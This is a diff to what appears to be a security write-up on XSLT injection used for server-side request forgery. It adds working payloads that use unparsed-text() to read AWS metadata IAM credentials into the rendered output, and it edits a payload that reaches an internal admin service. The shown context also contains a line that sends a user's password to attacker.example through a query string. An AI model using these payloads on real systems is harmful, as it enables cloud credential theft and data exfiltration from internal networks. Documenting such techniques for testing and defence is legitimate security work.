@@ -36,11 +36,17 @@ A non-XML file handed to `document()` triggers a parse error, and when the engin
 The same function accepts `http://` and `https://` URIs, turning the transform engine into a request proxy positioned inside the network perimeter:
 
 ```xml
-<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
-<xsl:copy-of select="document('http://internal-admin.svc.local/users')"/>
+<xsl:copy-of select="document('http://internal-admin.svc.local/users.xml')"/>
 ```
 
-The cloud metadata service is the highest-value target because the credential response is embedded in the rendered output. Internal-only admin panels, service APIs, and health endpoints are reachable the same way. Where the response is not reflected, the request still fires, so a URI pointed at an attacker-controlled host confirms blind SSRF and carries data out through the path or query string:
+`document()` parses the response as XML, so it embeds XML responses directly; an endpoint that returns plain text or JSON (including the cloud metadata service) makes the XML parse fail, but the request still fires, which is enough for blind SSRF and, where the engine echoes the parse error, often leaks the response body anyway. To read a text or JSON response cleanly into the output, use `unparsed-text()`:
+
+```xml
+<xsl:value-of select="unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
+<xsl:value-of select="unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-readonly')"/>
+```
+
+The cloud metadata service is the highest-value target because the credential response comes straight back in the rendered output. Internal-only admin panels, service APIs, and health endpoints are reachable the same way. Where the response is not reflected, the request still fires, so a URI pointed at an attacker-controlled host confirms blind SSRF and carries data out through the path or query string:
 
 ```xml
 <xsl:value-of select="document(concat('http://attacker.example/x?d=', encode-for-uri(//user[1]/password)))"/>
